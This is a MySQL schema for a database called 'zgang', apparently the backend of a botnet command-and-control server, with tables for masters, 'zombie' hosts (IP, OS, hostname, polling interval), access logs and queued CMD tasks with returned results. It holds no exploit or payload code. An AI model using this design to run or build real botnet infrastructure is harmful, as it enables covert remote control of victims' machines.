use zgang;
CREATE TABLE Users (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
username varchar(255) NOT NULL UNIQUE,
pswd varchar(60) NOT NULL,
registered_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
public_ip varchar(15) NOT NULL,
country varchar(15) NOT NULL
);
CREATE TABLE Masters (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
username varchar(255) NOT NULL UNIQUE,
public_key varchar(255) NOT NULL
);
CREATE TABLE Zombies (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
username varchar(255) NOT NULL UNIQUE,
registered_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
os varchar(255),
current_public_ip varchar(15) NOT NULL,
current_country varchar(15) NOT NULL,
current_hostname varchar(255),
refresh_secs DOUBLE(8,1) UNSIGNED DEFAULT 10.5
);
CREATE TABLE AccessLogs (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
date_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
successful BOOLEAN NOT NULL,
username varchar(255) NOT NULL,
public_ip varchar(15) NOT NULL,
country varchar(15),
hostname varchar(255)
);
CREATE TABLE Tasks (
id int(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
task_type varchar(255) DEFAULT 'CMD',
task_content varchar(255) NOT NULL,
master_username varchar(255),
submit_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
to_exec_at timestamp,
to_stop_at timestamp,
zombie_username varchar(255) NOT NULL,
readed BOOLEAN,
running BOOLEAN,
result varchar(2048),
exec_at timestamp
);